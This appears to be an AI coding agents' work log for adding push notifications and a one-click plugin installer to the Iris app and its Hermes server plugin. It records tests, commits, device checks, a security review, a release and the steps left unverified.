- Verified: `pytest tests/test_push_apns.py tests/test_push_worker.py` red first (42 errors, no modules), then 43 passed, 1 skipped (`test_key_file_mode_checked` is POSIX-only; not run on this Windows machine); full suite `521 passed, 3 skipped`; `tools/build_skill_refs.py --check` exit 0; a local smoke run of the real `curl -K -` against a 127.0.0.1 echo server: URL, headers and a body with quotes, backslash and emoji arrived intact, 410 parsed from `-w`.
- Packages: `cryptography` 50.0.2 in the dev venv only (README venv line updated; Hermes already ships it).
- Deviations: (1) `build_request`/`send` take `now=` and `send` takes `run=` (testability). (2) 403 `ExpiredProviderToken` clears the token cache and is a `retry`; other 403s `fail`; curl timeout is `retry`, curl missing (OSError) `fail`. (3) Collapse ids over 64 bytes become their SHA-256 hex. (4) Bodies over APNs's 4 KB are cut at a byte boundary with "…". (5) `load_config` validates team/key ids (10 chars), bundle id and environment, and logs each distinct reason once. (6) Notice kind `test` is sendable; `POST push/test/{device}` is iOS only (404 otherwise), 503 with no config. (7) The worker starts on import of `plugin_api.py` unless `HERMES_IRIS_PUSH_WORKER=0` (set by `tests/conftest.py`); on POSIX it takes an exclusive lock on `<iris root>/push/.worker.lock` so only one dashboard process sends. (8) No config: the worker does nothing and leaves cursors alone. `push/status` now needs a valid config and `curl`.
- Decisions for later tasks: the APNs payload is `{"aps":{"alert":{"title","body"?},"sound":"default","thread-id":<session>,"category":"iris.approval"?},"iris":{"kind","session_id","event_id"}}`; iOS (Task 10) reads `iris.*` from `userInfo` and registers category `iris.approval` with actions `once` / `deny`. Real Apple delivery is untested until PS6 (needs the user's key and iPhone).
- segment PS3 complete. Next: PS4 (Sonnet), Task 7 app push API, settings and active marking.

### PS4 — doing — 2026-11-13 — Sonnet 5.5
- Running as Sonnet 5.5. Git matches the log (PS3 `7e9aaa0`/`6912fad` in history; HEAD `6912fad`, clean apart from `store/screenshots/`).
- Next: Task 7 app push API, settings and active marking.

### PS4 — Task 7 — done — 2026-11-13 — Sonnet 5.5
- Commits: cd654bf feat(push): notification settings, device registration and active chat marking
- Verified: tests were written before the code, but not run red on their own (they fail to compile without the new modules); then `flutter test test/data/push_api_test.dart test/data/push_controller_test.dart test/data/push_active_marking_test.dart test/features/settings/notifications_settings_test.dart` -> 28 + 11 pass (the marking test first undercounted because the mark is fire-and-forget; fixed by waiting 50 ms in the test); `flutter test --exclude-tags live` -> 1,811 pass, 4 skipped; `flutter analyze lib test` -> the 3 pre-existing infos only. The new light and dark goldens (`screen_notifications_settings_*`) were opened and looked at; the first pass repeated each event's name as group title and row label, so the group titles became Replies / Approvals / Scheduled jobs.
- Packages: none.
- Deviations: (1) Added a fourth test file, `test/data/push_active_marking_test.dart`, for the chat-send path (plan listed three); the settings goldens live in the shared `test/design/screens_golden_test.dart`, as the other screens' do. (2) `PreferenceKeys` are `pushDeviceId` (app-wide), `push` (switch, per server/profile, absent = off) and `pushSettings` (JSON). (3) `DashboardChat` keeps a runtime-id to stored-id map (filled by resume, create and branch) because a send names the runtime id and the plugin only knows the stored one; a send to a chat it never opened marks nothing. (4) `appVersion` is the constant `pushAppVersion = '1.0.0'` in `lib/app/push_providers.dart`; no `package_info_plus` was added for it (it must follow `pubspec.yaml`). (5) The Notifications group in Settings shows only when the plugin's `capabilities.features` has `push` (`pushAvailableProvider`) and not in the demo. (6) A registration that fails when switching on puts the switch back and shows a toast. (7) Settings edits are saved on the phone at once and sent to the server 600 ms after typing stops. (8) The test-notification row shows on iOS only (the server refuses Android devices); the Android connection row shows "—" until Task 9.
- Decisions for later tasks: `pushEnabledProvider`, `pushSettingsProvider`, `pushDeviceIdProvider`, `pushControllerProvider` (null with no live server) and `pushAvailableProvider` are in `lib/app/push_providers.dart`; `PushController(api, deviceId:, platform:, appVersion:, enabled:, settings:, apnsToken:)` takes the iOS token as a callback (Task 10 supplies it) and has `markActive`, `setEnabled`, `sync`, `saveSettings`, `sendTest`. `DashboardChat` takes `push:`. Nothing yet re-registers on app start; Tasks 9 and 10 should call `sync()`.
- Next: Task 8 tap routing and approve-on-open.

### PS4 — Task 8 — done — 2026-11-13 — Sonnet 5.5
- Commits: 1a0c28d feat(push): open the chat from a notification and answer its approval
- Verified: tests written first (parsing, controller, screen); `flutter test test/data/push_intents_test.dart` 11 pass; `flutter test test/features/push_approve_on_open_test.dart` 13 pass; `flutter test test/features/push_chat_screen_test.dart` 5 pass; `flutter test --exclude-tags live` -> 1,840 pass, 4 skipped; `flutter analyze lib test` -> the 3 pre-existing infos only. Not run: a real server, a real notification or the router opening a screen (`PushRouter`, `irisNavigatorKey`): nothing calls the router until Tasks 9 and 10, and the device pass (PS6) is where it is first exercised.
- Deviations: (1) `PushTap` gained two fields beyond the plan's four: `command` (what the notification showed; the only way to pick between two pending approvals, since the notice carries no request id) and a `jobId` getter read from the `cron_<job id>_<date>_<time>` session id; plus `PushTap.fromJsonString` for Android's string payload. (2) `ChatBackend` gained `resolveApproval` (returns whether the gateway still had the ask, from `approval.respond`'s `resolved` count) beside `pendingApprovals`; `answerApproval` now delegates to it. That is how "already answered" is told apart from "no longer waiting". (3) `PushRouter` is in `lib/app/push_router.dart` with `irisNavigatorKey` (the `MaterialApp` now takes it) and `pushRouterProvider`; it closes whatever is open (`popUntil` first) and pushes the chat, or `JobDetailScreen` for a job (found by `cronRepository.job(id)`; nothing opens if the job is gone). (4) To open a chat the same way from outside home, `_open`'s route and `_voiceHost` moved out of `conversation_list_screen.dart` into `lib/features/chat/chat_route.dart` (`chatRoute`, `voiceHostFor`, `serverHostOf`); behaviour is unchanged (the 1,840 tests include the home and voice ones). A chat opened from a notification has no pin/archive/delete menu (`menu: null`). (5) `foregroundChatProvider` is set by a small `ForegroundChatMarker` wrapped around the chat screen; it finds the provider container itself, so a chat built without a `ProviderScope` marks nothing. (6) An approval the chat already shows as a card is removed when the notification's button answers it. A failed list or answer shows an error line in the transcript and keeps the card.
- Decisions for later tasks: Tasks 9 and 10 build a `PushTap` from the notification (`PushTap.fromJsonString` on Android's payload, `PushTap.fromPayload` on iOS `userInfo`; put the notification's body in `command` for an approval) and call `ref.read(pushRouterProvider).open(tap)`; suppress a notice when `ref.read(foregroundChatProvider) == notice.session_id`. Buttons: `action` is `once` or `deny` only; anything else is dropped. The approval has a 300 s server timeout, so a late tap ends in "That approval is no longer waiting." or "already answered".
- segment PS4 complete. Next: PS5 (Opus), Task 9 Android foreground connection and notifications.

### PS5 — doing — 2026-11-13 — Opus 5.5
- Running as Opus 5.5. Git matches the log (PS4 `1a0c28d`/`6be1fc7` in history; HEAD `6be1fc7`, clean apart from `store/screenshots/`).
- Next: Task 9 Android foreground connection and notifications.

### PS5 — Task 9: Android foreground connection and notifications — done — 2026-11-13 — Opus 5.5
- Commits: 8840ea1 feat(push): Android foreground connection and notifications without Google
- Verified: the three new test files failed to compile first (no modules); then `push_stream_client_test` 16 pass (a silent-stream test hung on the first try: an `async*` SSE decoder cannot be cancelled while it waits, which would also have leaked the HTTP connection; rewritten as stream transformers), `foreground_arbiter_test` 9 pass, `android_push_task_test` 13 pass; `flutter test --exclude-tags live` -> 1,878 pass, 4 skipped; `flutter analyze lib test` -> the 3 pre-existing infos only; `flutter pub deps` has no firebase/google_mobile/play_services; `gradlew :app:dependencies --configuration releaseRuntimeClasspath` (Android Studio JBR 21; the JDK 26 on PATH fails Gradle) has no `com.google.firebase` / `com.google.android.gms`; `flutter build apk --debug --target-platform android-arm64` built; the APK's manifest has the service type 0x280 (`microphone|remoteMessaging`), `stopWithTask` false, and `FOREGROUND_SERVICE_REMOTE_MESSAGING`, `RECEIVE_BOOT_COMPLETED`, `VIBRATE` (new). Not run: anything on a phone (service start, Doze, reboot, a real stream, taps): PS6.
- Packages: `flutter_local_notifications` 22.3.3 (pinned; Android side: androidx core/media and `com.google.code.gson:gson` only). App now has core library desugaring (`desugar_jdk_libs` 2.1.4), which the package needs.
- Deviations: (1) **Changing the service type**: flutter_foreground_task 10.0.0 fixes the types at start and has no call to change them, so a small `iris/foreground` channel (`ForegroundTypesChannel.kt`) writes the plugin's stored types and Dart calls `restartService()`. The notification stays and the service is never stopped, but its isolate restarts and push reconnects from its cursor. Dropping the microphone type after a call can be refused from the background (Android 12+); the arbiter retries on the next resume. Tied to the plugin's preference names (pinned version). (2) **No stop-with-task**: the plugin's `stopWithTask: true` installs a hook that stops the service whenever the app's last activity pauses, and the hook cannot be removed for the rest of the process. That would have killed push after any call, and probably stopped screen-off calls too (an existing Phase 8 risk for its device pass). Now `stopWithTask` is always false, the manifest says false, and `MainActivity.onDestroy` sends `app_gone` to the service isolate, which stops a call-only service itself and otherwise takes the notification back for push. (3) **One task handler** (`startIrisServiceTask` in `android_push_task.dart`) replaces the call's `startCallTask`: it forwards the call's buttons and runs push. Call notifications keep their `iris_calls` channel when a call starts the service; when push starts it, the channel is `iris_connection` (low), and a later call shows there. (4) The service isolate writes its own "connected / can't reach / connecting" text (it runs with the app closed); the app only remembers the latest for when a call hands the notification back. The app and service exchange `hello`, `holder`, `foreground`, `reload`, `push_state` and `app_gone` messages. (5) Host (`lib/app/push_host.dart`, read by `IrisApp`): push follows the switch for the **active** server and profile; it is left alone while no server is chosen or in the demo, so a cold start does not stop a healthy connection. Each start calls `PushController.sync()` (re-registers). (6) Stream client details: a stream that delivered nothing counts as a failure (backoff) so a server that accepts and closes is not hammered; one that delivered frames is reopened at once; a 404 (unknown device) waits 60 s; a 401/403/3xx signs in once from the keystore, then backs off. Silence for 70 s (server pings every 25 s) is a dead stream. State flips to "unreachable" only on a failed attempt, never on a normal reconnect. (7) Notifications: one id, tagged by collapse id; approvals high importance with `once`/`deny` actions that open the app (`showsUserInterface`), so the lock screen asks for the unlock first (flutter_local_notifications exposes no `setAuthenticationRequired`); `visibility: private`. Icon is `@mipmap/ic_launcher` (a monochrome notification icon is a polish item for PS6). (8) Settings' Android connection row shows Connected / Connecting… / Can't reach it / —. (9) Release notes: a Phase 9.2 section in `docs/release.md` (permissions, Play foreground-service declaration).
- Decisions for later tasks: the service's stored data holds `iris.push.config` (server JSON, profile, device id; never secrets) and `iris.push.cursor.<server>/<profile>`. `foregroundArbiter` (in `foreground_driver.dart`) is the one arbiter. PS6 must check on the Moto G45: the service survives a swipe, Doze and a reboot; a call while push runs (mic type added via restart, call notification and buttons, then push's text back); a cold start from an approval button; the notification permission prompt on Android 13+.
- Next: Task 10 iOS APNs registration and actions (needs a Mac or cloud build for the Swift side).

### PS5 — Task 10: iOS APNs registration and actions — doing (Swift not yet compiled) — 2026-11-13 — Opus 5.5
- Commits: 03e98aa feat(push): iOS APNs registration, approval actions and foreground suppression
- Verified: `test/data/ios_push_channel_test.dart` failed to compile first (no module); then 9 pass (one test was miswired, reading the token from a detached channel; the test was fixed, not the code); `flutter test --exclude-tags live` -> 1,887 pass, 4 skipped; `flutter analyze lib test` -> the 3 pre-existing infos only. **Not run:** the Swift side has not been compiled. The user has a Mac (asked 2026-11-13) and will run `flutter build ios --no-codesign` on `feat/push`; Step 4 holds until that result is in.
- Deviations: (1) The native side is an `IrisPushPlugin` class inside `AppDelegate.swift`, not a new file (a new Swift file needs hand edits to the Xcode project's build phases). It registers on the implicit engine's registrar as a method-call and application delegate; `AppDelegate` sets itself as the `UNUserNotificationCenter` delegate, and `FlutterAppDelegate` passes notifications on to plugins. A tap that arrives before the engine exists is held in `AppDelegate.didReceive` and delivered once Dart calls `ready`. (2) Channel methods beyond the plan: `ready` (Dart → iOS, flush held taps) and `tokenError` (iOS → Dart, the error code only). (3) `iosPushChannelProvider` in `push_providers.dart` routes taps through the new `PushRouter.openWhenReady` (waits up to ~10 s for a server and a navigator; the Android host now uses it too), and supplies `PushController`'s `apnsToken`; a new token triggers `sync()`. `pushControllerProvider` and `iosPushChannelProvider` carry explicit types (they refer to each other; inference made them dynamic). (4) Permission is asked when push is on for the active server (host's `PushOn`), not at launch. (5) `aps-environment` is `development` in the repo; `CODE_SIGN_ENTITLEMENTS` set on the Runner target's Debug, Release and Profile. No `remote-notification` background mode (alerts only). (6) iOS release notes in `docs/release.md`.
- Next: the user's `flutter build ios --no-codesign` result; fix any Swift error; then log `segment PS5 complete`.

### PS5 — done (Swift compile deferred) — 2026-11-13 — Opus 5.5
- The user deferred the Mac build ("Defer mac to later"). Task 10 Step 4's Swift compile moves to PS6, which needs the Mac and the iPhone anyway. **Deviation:** PS5 is closed with `ios/Runner/AppDelegate.swift` (IrisPushPlugin), `Runner.entitlements` and the `project.pbxproj` entries **not yet compiled**. PS6 starts on the Mac with `flutter pub get && (cd ios && pod install) && flutter build ios --no-codesign`; a Swift error found there is fixed in PS6 before the device pass.
- **segment PS5 complete.** Next: PS6 (Sonnet), Task 11 device pass on the Moto G45 and the iPhone, starting with the deferred iOS compile.

### PS6 — doing — 2026-11-13 — Sonnet 5.5
- Running as Sonnet 5.5. Git matches the log (PS5 `03e98aa`/`81781ee` in history; HEAD `81781ee`, clean apart from `store/screenshots/`).
- Waiting on the user for Task 11 prerequisites (plugin 0.4.0 on the server with `apns.json` and key, Moto G45 connected, Mac for the deferred `flutter build ios --no-codesign`).
- Next: Step 1 (install plugin, `GET push/status`), with the iOS Swift compile on the Mac.

### PS6 — scope change — 2026-11-13 — Sonnet 5.5
- Plugin source (0.3.0 contents, with push) installed on the user's server by me over SSH; dashboard restarted, active, no iris errors. `apns.json` not placed yet (iOS only).
- User deferred all iOS work. PS6 is now Android only; Task 11 Step 3 and the Swift compile moved to `docs/superpowers/plans/ios-deferred.md` (items I1, I2), run on the Mac with the new `/ios` command (`.claude/commands/ios.md`).
- User asked for two things before the Android device pass: (1) a post-login onboarding screen that installs the Iris plugin in one click and shows what is missed without it; (2) a Settings row that installs/shows version/offers updates. Not in the Phase 9 plan: needs its own spec (brainstorm) before code. PS6 stays `doing`, paused.

### Plugin installer — spec and plan — 2026-11-13 — Sonnet 5.5
- Spec `a7086fd` (approved by the user), plan `docs/superpowers/plans/2026-11-13-plugin-installer.md`. Extra work the user asked for inside 9.2 on `feat/push`: onboarding screen plus Settings row that installs/updates the hermes-iris plugin through Hermes's own `/api/dashboard/agent-plugins/install` (pinned release SHA, `force`).
- Order: IN1, IN2, then PS6 (Android only), PS7 (release, tag), then IN3 (live reinstall, needs the tag and the user's yes). PS6 stays `doing`, paused.
- Next: IN1, Task 1.

### IN1 — Tasks 1-2 — done — 2026-11-13 — Sonnet 5.5
- Commits: fe97dd1 pinned release and installer; fdc3839 install state, onboarding flag and status providers
- Verified: tests red first (missing modules), then `flutter test test/data/plugin_installer_test.dart` 18 pass and `test/app/plugin_providers_test.dart` 12 pass; `flutter test --exclude-tags live` -> 1,917 pass, 4 skipped; `flutter analyze lib test` -> the 3 old infos only (after fixing my import order).
- Deviations: (1) Worked on `feat/push` with this log as the ledger, no worktree or sdd scripts (run book rules). (2) Added seams the plan did not name: `pluginReleaseProvider` and `pluginReprobeProvider` (tests pin a release and count re-probes). (3) A 200 with an `error` field arrives as a rejected failure from `ApiClient`; the installer treats a rejected failure without a status as "show the command". (4) `PluginRelease.current.sha` is empty until Task 5, so `released` is false and onboarding stays hidden. (5) The plugin.yaml guard test checks the release version is not lower than the plugin's (the plugin is still 0.3.0).
- Decisions for later tasks: `pluginStatusProvider` is loading until the first probe, `PluginAbsent` when the plugin is not confirmed, `PluginInstalled(version, updateTo)` otherwise (`unknown` version offers the update). `pluginInstallProvider` states: `PluginInstallIdle/Installing/Failed(result)/Done(result)`; success also marks the offer seen. `PluginInstallResult` has `ok, error, showCommand, installedVersion, recheckFailed`.
- segment IN1 complete. Next: IN2 (Sonnet), Task 3 Settings section.

### IN2 - doing - 2026-11-13 - Sonnet 5.5
- Running as Sonnet 5.5. Git matches the log (IN1 fdc3839 in history; HEAD f58f99c, clean apart from store/screenshots/).
- Next: Task 3 Settings section.

### IN2 - Task 3 - done - 2026-11-13 - Sonnet 5.5
- Commits: a60129a feat(plugin): Settings row to install and update the plugin
- Verified: tests red first (module missing), then `flutter test test/features/plugin/plugin_ui_test.dart` 8 pass; `flutter test --exclude-tags live` -> all pass, 4 skipped; `flutter analyze lib test` -> the 3 old infos only. New goldens `screen_plugin_settings{,_update}_{light,dark}` opened and looked at (absent dark, update light).
- Deviations: (1) The group shows only once the status provider has data (hidden while the probe is pending, offline, or in the demo), not with a "Checking..." row: that row appeared in four existing Settings goldens (no live session in tests) and would sit there forever offline. (2) Rows: "Iris plugin" (value Not installed / version), then "Add it to your server" + Install, or "Update available" + "Update to X", or "Up to date". (3) The panel's failure view offers "Copy command" only when the release has a pinned sha (else the command would have no ref) plus "Try again". (4) Two extra goldens: the update state.
- Decisions for later tasks: `PluginInstallPanel(state:, release:, onRetry:)` in `lib/features/plugin/plugin_install_panel.dart` renders installing / done / failed; Task 4 reuses it. Tests override `pluginStatusProvider`, `pluginInstallerProvider` (real installer on FakeHttp) and `pluginInstallProvider` (a slow fake notifier).
- Next: Task 4 onboarding screen and host.

### IN2 - Task 4 - done - 2026-11-13 - Sonnet 5.5
- Commits: 3b0e344 feat(plugin): onboarding screen that installs the plugin
- Verified: tests red first (screen and host missing), then `flutter test test/features/plugin/plugin_ui_test.dart` 15 pass (8 Settings, 7 onboarding), three runs in a row; `flutter test --exclude-tags live` -> 1,942 pass, 4 skipped; `flutter analyze lib test` -> the 3 old infos only. Six new goldens (`screen_plugin_onboarding{,_installing,_failed}_{light,dark}`) opened: offer dark, installing dark, failed light. Not run: the host in the real app on a phone or against a real server (IN3 and the PS6 device pass).
- Deviations: (1) The host pushes with `Navigator.of(context)` from inside the home route, not `irisNavigatorKey` (it sits under the same Navigator, so it needs no global key). (2) The install buttons sit in the screen's pinned footer, the panel and rows in the scroll body; after a failure the primary button gives way to the panel's "Try again". (3) Tests wait for an install by polling `pluginInstallProvider` in real time (a fixed 50 ms wait flaked under the full suite). (4) The offer screen and the Settings group both stay hidden until the release has a pinned sha (`PluginRelease.released`), so nothing shows in this build until IN3 fills it in.
- Decisions for later tasks: IN3 only needs the sha in `plugin_release.dart` (`PluginRelease.current.sha`) and the live reinstall; the guard test compares the version with `plugin.yaml`. With `sha` empty the onboarding never appears and the Settings Install button reports "no released plugin yet" with no command (by design).
- segment IN2 complete. Next: PS6 (Sonnet), the Android device pass (Task 11 on the Moto G45); needs the user's phone connected. IN3 waits for PS7's release.

### PS6 - doing - 2026-11-14 - Sonnet 5.5
- Resumed with the Moto G45 connected (adb serial in the user's shell only). Debug arm64 APK installed over the old data; signed in, plugin 0.3.0 on the server, Notifications group shown.
- Defect found on the phone and fixed test-first: `decodeSse` crashed on a real HTTP body (`Utf8Decoder` is not a `StreamTransformer<Uint8List,String>`), so the stream never ran although the notification said connected. Tests had used `Stream<List<int>>`. Fix `7929db1` (`.cast<List<int>>()`), new Uint8List test. After reinstall: foreground service up (type remoteMessaging), notification "Iris is connected", no Dart errors.
- Next: Step 2 checks from "A reply" on: long request, lock, reply notice; then approval, job, open chat suppressed, airplane mode, call.

### PS6 - doing - 2026-11-14 00:35 - Sonnet 5.5
- Android Step 2 so far, on the Moto G45 (debug arm64 APK, plugin 0.3.0 on the server):
  - Pass: notifications switch registers; foreground service up (types 0x200 = remoteMessaging); "Iris is connected" after the decode fix; no Dart errors.
  - Pass: reply notice arrived with the phone locked and the chat off screen: channel `iris_reply`, title = the user's words ("Attention!"), no body in "Only my text" mode, visibility private, default importance.
  - Defect 2 fixed (`7c3255b`): every app start put "Iris is connecting" on the live notification (the host's `need()` with the app-side state `off`), and the service returned early on an unchanged `reload` without re-posting. The service now re-announces its state. Deviation: not test-first, the task handler only runs inside the service isolate and has no unit seam; checked on the phone instead (stays "connected" across an app start and a relaunch).
- In flight: an approval prompt (`rm -rf` of a nonexistent /tmp dir) was sent from a new chat and the phone locked; no `iris_approval` notice after 3.5 min. The phone was locked when I came back, so I could not see the chat. Not yet known whether the model is still thinking, asked nothing, or the approval event did not reach the stream.
- Next: user unlocks; read the chat state; then approval, job, open-chat suppression, airplane mode, call.

### PS6 - doing - 2026-11-14 03:55 - Sonnet 5.5
- Defect 3 fixed test-first (`276e0dc`): a notice's post and its withdrawal ran in parallel, so an `approval_done` could be cancelled before the slow post of its `approval` landed (a reconnect replays both back to back) and the notice stayed in the shade. Notices are now handled one at a time, in order. The new test failed before the fix and passes after.
- Server read over SSH (read-only): the plugin writes `approval`, then `approval_done` the moment the approval is answered, then the reply. So the stale notice was on the device side. The earlier missing reply for the `rm -rf` chat was the open-chat suppression working (the event was written while that chat was on screen).
- Pass (live, after the fix): approval notice appeared with the phone locked and the chat off screen; Approve once from the notice, then the notice left the shade (`dumpsys notification` shows no `approval-*` tag, only the system's own `ranker_group` summary). The reply notice (`reply-...6146c8`) arrived after it.
- Pass: a cron job notice (`job-cron_...`) is showing on `iris_job`.
- Still to run: open chat not notified (partly seen), airplane mode 2 min then reconnect replay, a voice call during push, screenshots.

### PS6 - doing - 2026-11-14 04:00 - Sonnet 5.5
- The user deferred the rest of the Android device pass. Not run yet, and not passed: open chat not notified (clean run), airplane mode 2 min then reconnect replay, voice call during push, Step 4 screenshots.
- PS6 stays `doing`, not `done`. Resume with `/phase9` on the Moto G45 (serial ZN4226ZPW5, debug APK from `276e0dc` installed), run those four, then log `segment PS6 complete`. PS7 waits for that.

### PS6 - doing - 2026-11-14 - Opus 5.5
- Resumed on Opus (higher than Sonnet, allowed). Git matches the log (HEAD `5868719`). Moto G45 connected; service up, "Iris is connected"; earlier reply, approval-summary and job notices still in the shade.
- User's answers for the rest: Claude drives the phone over adb; "a voice call" in Step 2 means Iris voice mode (Phase 8 live voice) during push.
- "Attention!" as the job notice title is by design ("Only my text" mode swaps the title for a generic phrase), not a defect.
- The user deferred the remaining four checks again (phone was in a call). Not run: open chat not notified, airplane mode 2 min then replay, Iris voice mode during push, Step 4 screenshots.
- Next: on the user's go-ahead with the phone free, run those four over adb, then log `segment PS6 complete`. PS7 waits for that.

### PS6 - doing - 2026-11-14 04:45 - Opus 5.5
- User asked to run the remaining checks on the Pixel_9 emulator instead of the Moto G45 (phone busy). Debug x86_64 APK built from `b898e5b` (product code as `276e0dc`), installed over the old data (still signed in); notification permission granted with `pm grant`; "Notify me" on; "Iris is connected" within 20 s.
- Pass (emulator): open chat not notified. Prompt sent 04:15:08 with the chat on screen; reply "open" shown; no `iris_reply` notice; the stored push cursor moved to an event at 04:15:16, so the event arrived and was suppressed. Contrast: the next reply in the same session, sent and then left for the home screen, did post `reply-20261113_224509_79c773`.
- Pass (emulator): airplane mode. Offline 04:21:55 while Hermes ran `sleep 90`; "Iris can't reach your server" throughout; reply written 04:23:13 (cursor); online 04:24:35, "connected" by 04:25:07, reply notice re-posted with an alert at 04:24:58. Reconnect after the first 2 min offline took ~70 s (backoff), as designed. Note: a replay of a session that already has a notice replaces it under the same tag.
- Partial (emulator): Iris voice mode during push. Hands-free call connected ("Hearing you"); the shared foreground notification switched to "Talking with Iris"; the service stayed up (types 0x200). Not shown: push working again after the call. The host's internet dropped mid-call (Windows ping and curl to the server failed), so "can't reach" after the call is the network, not a defect; the emulator was cold-booted and its RebootReceiver restarted the service, but the host link was still failing (curl exit 35).
- Still to run: push reconnects and notifies after a voice call ends (needs a stable connection); Step 4 screenshots.
- Next: with the network stable, open Iris on the emulator, check "connected", start and end a hands-free call, send a prompt and leave the chat, see the reply notice; then screenshots and `segment PS6 complete`.

### PS6 - Android device pass - done - 2026-11-23 00:40 - Sonnet 5.5
- Commits: none (no product code changed). Product code on the phone is `276e0dc`; this log and the screenshots are the commit.
- Verified on the Moto G45 (debug arm64 APK built from `77d9b04`, plugin 0.3.0 on the server): "Notify me" on -> "Iris is connected" within ~30 s. Iris voice mode (hands-free) connected ("Hearing you"); the shared notification switched to "Talking with Iris" and the service types went 0x200 -> 0x280 (microphone added). After End call: "Iris is connecting" for ~15 s, then "Iris is connected", types back to 0x200. A prompt sent after the call, with the app sent to the home screen, posted a reply notice (`reply-20261122_190818_b854a1`, channel `iris_reply`, visibility private). With the emulator results from earlier, every Step 2 item now has a pass.
- Finding (server config, not an app defect): the first post-call reply (profile `sully`) produced no notice. The `sully` Hermes profile has its own config whose `plugins.enabled` is only `honcho`, so the iris hooks never run for its chats (no outbox event; the mark in `active.json` was never taken). Re-running under the `default` profile worked. To get push for other profiles the user must enable `iris` in each profile's config (not done; the server was only read).
- Deviations: (1) Toolchain: the user's Flutter SDK had moved to the `main` channel on 2026-11-22 (3.51 pre-release), which cannot build this project (Gradle 8.14 / AGP 8.11.1 rejected, then an AGP DSL error). With the user's yes, I switched the SDK back to `stable` (3.41.6, the revision used for the earlier builds). Files the new tool auto-edited (`analysis_options.yaml`, `android/gradle.properties`, `pubspec.lock`, windows plugin files) were reverted. (2) Step 3 (iOS) was not run: no iPhone or Mac here. iOS Swift compile and the iOS list remain unverified. (3) Screenshots are Iris screens only (reply chat, Notifications settings) in `docs/superpowers/plans/2026-11-13-push-device/`; the notification shade was not captured because it shows other apps' content. The notice facts above come from `dumpsys notification`.
- Decisions for later tasks: PS7's review should list "iOS device pass not run" as an open item and the per-profile plugin enablement in the release notes / README. Flutter must stay on `stable` for this repo until Gradle/AGP are upgraded.
- segment PS6 complete (Android). Next: PS7 (Opus), Task 12: final review, release, PR.

### PS7 — doing — 2026-11-23 — Opus 5.5
- Running as Opus 5.5. Git matches the log (PS6 `276e0dc` in history; HEAD `ebf586c`, clean apart from `store/screenshots/` and the untracked Phase 10–15 planning files from 2026-11-17).
- The log had 11 Windows-1252 dash bytes in the 2026-11-13 entries; re-encoded as UTF-8 (text unchanged).
- Next: Task 12 Step 1, review the whole branch inline.

### PS7 — Task 12 Steps 1–3 — done; Step 4 waits for the user — 2026-11-23 — Opus 5.5
- Commits: 8f65a3d fix(push): never answer an approval the notification did not show; fbb076d chore(release): hermes-iris 0.4.0 with push notifications
- Review (inline, `feat/genui...HEAD`, 45 commits, 107 files; PR base is `feat/genui` because PR #42 is still open). Security checks held: the APNs key is read only to sign, must be mode 0600, and never logged; the provider JWT, device token and body go to curl on stdin (`-K -`), and curl's stderr is not logged; config values are quoted and line breaks refused; the token is validated as hex and never returned by any route. In `text` mode the server leaves out preview, command and job name per device (`render.py`), so APNs and SSE carry only ids. The outbox and device files are 0600. Hooks never raise and log nothing but types. Android keeps no secrets in the service's stored data (the login stays in the keystore), the notification is `private` on the lock screen, and the approval buttons open the app after unlock. Logs hold status codes and error types only.
- Defect found and fixed test-first: `ChatController._pickApproval` fell back to the oldest waiting approval when the notification's command matched none, so Approve once could approve a different command the person never saw (Review Focus 3). It now answers only a matching command, or, with no command shown, the single waiting approval. Otherwise it shows the waiting approvals as cards with a notice. Three new tests failed before the fix (two old "the oldest" tests were replaced) and pass after.
- Verified: `flutter test --exclude-tags live` -> 1,945 pass, 4 skipped; plugin `pytest` -> 521 pass, 3 skipped (after the bump too); `flutter analyze lib test` -> the 3 pre-existing infos only; `test/data/plugin_installer_test.dart` 18 pass.
- Step 3: plugin 0.4.0 in `plugin.yaml`, `pyproject.toml`, `__init__.__version__`, `dashboard/manifest.json` and the README; the changelog entry is in the repo-root `CHANGELOG.md` (the plugin has no changelog of its own). The Play `remoteMessaging` note was already in `docs/release.md` (PS5); added there: iOS not compiled or device-tested (do not ship iOS push before I1/I2), and per-profile enablement. README: enable `iris` in each Hermes profile's `plugins.enabled`.
- Open items, not defects: (1) iOS Swift compile and device pass not run (`ios-deferred.md` I1, I2). (2) A notification tapped after switching the active server or profile opens the chat on the active one (push follows the active profile). (3) Outbox ids come from `time_ns` in two processes, so an append racing within microseconds could be skipped by a cursor (documented trim race likewise). (4) Text mode with one approval waiting answers it even if it is not the one notified (the notice carries no request id).
- Deviations: the log's 11 Windows-1252 dash bytes were re-encoded as UTF-8.
- Next: Step 4 needs the user: tag `hermes-iris-v0.4.0`, push `feat/push`, open the PR (base `feat/genui`, or `main` after #42 merges). Then IN3 (fill `PluginRelease.current.sha` from the tag, live reinstall).

### PS7 — Task 12 Step 4 — done — 2026-11-23 — Opus 5.5
- User said yes. Tagged `hermes-iris-v0.4.0` (annotated) at `fbb076d55a8a796ce8d47b11581d19ebe7483cde`, pushed `feat/push` and the tag, opened PR #43 (base `feat/genui`, stacked on #42). Nothing merged.
- segment PS7 complete. Next: IN3 (Sonnet), plugin installer Task 5: set `PluginRelease.current.sha` to `fbb076d55a8a796ce8d47b11581d19ebe7483cde`, then the live reinstall on the user's server (needs the user's yes).

### IN3 - Task 5 Step 1 - done; Step 2 waits for the user - 2026-11-23 - Sonnet 5.5
- Running as Sonnet 5.5. Git matches the log (PS7 `fbb076d` in history; HEAD `5c474b3`, clean apart from the untracked Phase 10-15 planning files and `store/screenshots/`).
- Commits: 05daea1 feat(plugin): pin the hermes-iris 0.4.0 release commit
- Step 1: `PluginRelease.current.sha` = `fbb076d55a8a796ce8d47b11581d19ebe7483cde` (`git rev-parse hermes-iris-v0.4.0^{commit}`). New test `this build pins a released commit` failed first, then passed.
- Verified: `flutter test test/data/plugin_installer_test.dart` 19 pass; `flutter test --exclude-tags live` -> 1,946 pass, 4 skipped; `flutter analyze lib test` -> the 3 old infos only. Regenerated Windows plugin files reverted.
- Next: Step 2 needs the user's yes: install a build with the pinned sha on the Moto G45 (connected, ZN4226ZPW5), then Settings, Iris plugin, Update against their server (the plugin there is 0.3.0). Check Hermes reports ok, capabilities read 0.4.0, `~/.hermes/plugins/iris` replaced with no second plugin dir, `~/.hermes/iris/default` untouched, push and displays still work; note any consent or scan gate. Step 3 only if the route or login is refused.

### IN3 - Task 5 Step 2 - blocked - 2026-11-23 - Sonnet 5.5
- With the user's yes: debug arm64 APK (pinned sha, from `05daea1`) installed on the Moto G45 over the old data. Settings, Iris plugin showed `0.3.0` and "Update to 0.4.0" (so probe, status and group work on a real server). Tapped it.
